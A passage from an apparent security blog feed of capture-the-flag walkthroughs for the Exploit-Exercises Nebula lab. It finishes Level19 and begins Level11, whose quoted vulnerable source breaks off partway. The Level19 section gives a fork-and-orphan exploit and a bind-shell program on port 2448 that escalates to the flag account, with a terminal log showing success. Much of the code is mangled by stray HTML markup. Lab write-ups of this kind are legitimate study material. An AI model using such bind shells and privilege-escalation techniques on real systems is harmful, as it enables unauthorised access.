</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">check</span> <span class="n">the</span> <span class="n">owner</span> <span class="n">id</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">statbuf</span><span class="p">.</span><span class="n">st_uid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">If</span> <span class="n">root</span> <span class="n">started</span> <span class="n">us</span><span class="p">,</span> <span class="n">it</span> <span class="n">is</span> <span class="n">ok</span> <span class="n">to</span> <span class="n">start</span> <span class="n">the</span> <span class="n">shell</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span>  <span class="n">execve</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
</span><span class='line'>  <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;Unable to execve&quot;</span><span class="p">);</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">You</span> <span class="n">are</span> <span class="n">unauthorized</span> <span class="n">to</span> <span class="n">run</span> <span class="n">this</span> <span class="n">program</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>To pass the last challenge, our process parent id should match uid 0. This
could be easily achieved when the parent dies and the orphan process is adopted
by init.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>man 2 wait&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>  A child that terminates, but has not been waited for becomes a &ldquo;zombie&rdquo;.  The
</span><span class='line'>  kernel maintains a minimal set of information about the zombie process (PID,
</span><span class='line'>  termination status, resource usage information) in order to allow the parent to
</span><span class='line'>  later perform a wait to obtain information about the child.  As long as a
</span><span class='line'>  zombie  is  not  removed from  the  system  via a wait, it will consume a slot
</span><span class='line'>  in the kernel process table, and if this table fills, it will not be possible
</span><span class='line'>  to create further processes.  If a parent process terminates, then its &ldquo;zombie&rdquo;
</span><span class='line'>  children (if any) are adopted by init(8), which automatically performs a wait
</span><span class='line'>  to remove the zombies.&lt;br/></span></code></pre></td></tr></table></div></figure></p>

<p>Exploit:
<figure class='code'><figcaption><span>exploit19.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="kt">pid_t</span> <span class="n">childpid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">childpid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="cm">/* child */</span>
</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">cmd</span> <span class="o">=</span> <span class="s">&quot;/home/flag19/flag19&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="s">&quot;-c&quot;</span><span class="p">,</span> <span class="s">&quot;/tmp/bindshell&quot;</span> <span class="p">};</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
</span><span class='line'>    <span class="n">execv</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">argv</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Binding shell to port 2448, binary will be called from exploit.
<figure class='code'><figcaption><span>bindshell.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">socket</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">netinet</span><span class="o">/</span><span class="n">in</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>        <span class="kt">int</span> <span class="n">sockfd</span><span class="p">;</span>
</span><span class='line'>        <span class="kt">int</span> <span class="n">clientfd</span><span class="p">;</span>
</span><span class='line'>        <span class="kt">socklen_t</span> <span class="n">cli_len</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span>    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">srv_addr</span><span class="p">;</span>
</span><span class='line'>    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">cli_addr</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">srv_addr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
</span><span class='line'>    <span class="n">srv_addr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">2448</span><span class="p">);</span>
</span><span class='line'>    <span class="n">srv_addr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">htonl</span><span class="p">(</span><span class="n">INADDR_ANY</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="n">IPPROTO_IP</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">bind</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">srv_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">srv_addr</span><span class="p">));</span>
</span><span class='line'>    <span class="n">listen</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="cm">/* accept new connections */</span>
</span><span class='line'>    <span class="n">cli_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">cli_addr</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span><span class='line'>    <span class="n">clientfd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">cli_addr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">cli_len</span> <span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">dup2</span><span class="p">(</span><span class="n">clientfd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="cm">/* replace 0 with clientfd */</span>
</span><span class='line'>    <span class="n">dup2</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>        <span class="cm">/* replace stdout &amp;amp; stderr */</span>
</span><span class='line'>    <span class="n">dup2</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">setreuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">());</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">execv</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ cd /tmp&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>sh-4.2$ gcc bindshell.c -o bindshell&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>sh-4.2$ gcc exploit19.c -o exploit19&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>sh-4.2$ ./exploit19&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>sh-4.2$ nc 0 2448
</span><span class='line'>id
</span><span class='line'>uid=980(flag19) gid=1020(level19) groups=980(flag19),1020(level19)
</span><span class='line'>getflag
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploit-Exercises: Nebula (11-15)]]></title>
    <link href="http://73696e65.github.io/blog/2015/06/18/exploit-exercises-nebula-11-15/"/>
    <updated>2015-06-18T19:13:09+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/06/18/exploit-exercises-nebula-11-15</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-nebula-v5,31/">Exploit-Exercises: Nebula (v5)</a></p>

<h2>Level11</h2>

<p>According to the assignment, there should be two ways how to exploit the source below.
<figure class='code'><figcaption><span>level11.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">types</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">fcntl</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">mman</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;/&lt;</span><span class="n">em</span><span class="o">&gt;</span>
</span><span class='line'> <span class="o">*</span> <span class="n">Return</span> <span class="n">a</span> <span class="n">random</span><span class="p">,</span> <span class="n">non</span> <span class="n">predictable</span> <span class="n">file</span><span class="p">,</span> <span class="n">and</span> <span class="k">return</span> <span class="n">the</span> <span class="n">file</span> <span class="n">descriptor</span> <span class="k">for</span> <span class="n">it</span><span class="p">.</span>
</span><span class='line'> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">getrand</span><span class="p">(</span><span class="kt">char</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;*</span><span class="n">path</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">tmp</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">pid</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">srandom</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">tmp</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">TEMP</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="n">pid</span> <span class="o">=</span> <span class="n">getpid</span><span class="p">();</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">asprintf</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">%</span><span class="n">s</span><span class="o">/%</span><span class="n">d</span><span class="p">.</span><span class="o">%</span><span class="n">c</span><span class="o">%</span><span class="n">c</span><span class="o">%</span><span class="n">c</span><span class="o">%</span><span class="n">c</span><span class="o">%</span><span class="n">c</span><span class="o">%</span><span class="n">c</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">tmp</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span>
</span><span class='line'>      <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mi">0</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">10</span><span class="p">),</span>
</span><span class='line'>      <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">a</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">),</span>
</span><span class='line'>      <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mi">0</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">10</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">a</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">));</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">path</span><span class="p">,</span> <span class="n">O_CREAT</span><span class="o">|</span><span class="n">O_RDWR</span><span class="p">,</span> <span class="mo">0600</span><span class="p">);</span>
</span><span class='line'>  <span class="n">unlink</span><span class="p">(</span><span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">path</span><span class="p">);</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">fd</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">process</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">int</span> <span class="n">length</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">key</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">key</span> <span class="o">=</span> <span class="n">length</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="mh">0xff</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="n">length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">key</span><span class="p">;</span>
</span><span class='line'>      <span class="n">key</span> <span class="o">-=</span> <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
